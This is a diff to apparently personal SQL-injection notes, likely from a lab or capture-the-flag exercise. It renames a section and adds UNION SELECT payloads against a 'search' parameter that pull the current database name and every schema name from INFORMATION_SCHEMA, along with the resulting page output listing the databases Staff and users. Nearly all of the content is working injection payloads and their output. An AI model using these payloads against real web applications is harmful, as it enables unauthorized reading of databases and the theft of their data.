@@ -3,7 +3,7 @@
   * [INFORMATION_SCHEMA Tables](#information_schema-tables)
 * [Manual Methods](#manual-methods)
   * [enumerate fields of search query](#enumerate-fields-of-search-query)
-  * [show database](#show-database)
+  * [enumerate database](#enumerate-database)
 
 # `sqlmap`
 
@@ -29,7 +29,8 @@ search=killer' UNION SELECT 1,2,3,4,5,6-- -
 <h3>Search results </h3>
 ID: 1<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>
 ```
-## show database
+## enumerate database
+### current database
 ```
 search=killer' UNION SELECT database(),2,3,4,5,6-- -
 ```
@@ -46,4 +47,12 @@ search=killer' UNION SELECT SCHEMA_NAME,2,3,4,5,6 FROM INFORMATION_SCHEMA.SCHEMA
 ID: information_schema<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: Staff<br/>Name: 2 3
 <br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: users<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email:
 6<br/>
+```
+### all databases
+```
+search=killer' UNION SELECT GROUP_CONCAT(SCHEMA_NAME),2,3,4,5,6 FROM INFORMATION_SCHEMA.SCHEMATA-- -
+```
+```
+<h3>Search results </h3>
+ID: information_schema,Staff,users<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>
 ```
